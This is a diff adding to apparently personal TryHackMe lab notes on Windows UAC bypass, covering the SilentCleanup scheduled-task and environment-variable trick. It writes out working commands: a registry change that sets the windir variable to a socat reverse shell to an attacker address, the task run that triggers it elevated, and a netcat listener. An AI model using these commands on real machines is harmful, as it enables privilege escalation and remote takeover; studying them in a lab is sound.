@@ -86,3 +86,20 @@ reg delete "HKCU\Software\Classes\ms-settings\" /f
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 UAC Environment variable expansion
+-UAC configured to "Always Notify" - autoElevate won't work beacuse the user has to be prompted
+-use a scheduled task that can be run by the user but executed with high privilege - independent of UAC security level
+
+-disk cleanup scheduled task
+run on demand using: 
+%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
+
+steps:
+nc -lvp 4446
+nc [Room-IP] 9999
+
+C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
+C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+C:\flags\GetFlag-diskcleanup.exe
+THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}
+
